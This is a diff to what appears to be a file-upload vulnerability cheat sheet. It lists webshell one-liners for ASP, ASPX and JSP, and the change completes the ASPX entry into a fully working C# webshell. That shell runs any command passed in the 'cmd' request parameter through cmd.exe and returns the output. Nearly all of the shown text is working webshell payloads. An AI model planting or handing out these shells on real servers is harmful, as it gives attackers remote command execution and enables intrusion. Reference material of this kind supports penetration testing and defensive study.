@@ -32,7 +32,7 @@ File upload vulnerabilities allow executing arbitrary code on the server when va
 
 # ASP/ASPX webshell:
 <% eval request("cmd") %>
-<%@ Page Language="C#"%><%Response.Write(new System.Diagnostics.Process()...%>
+<%@ Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd());%>
 
 # JSP webshell:
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
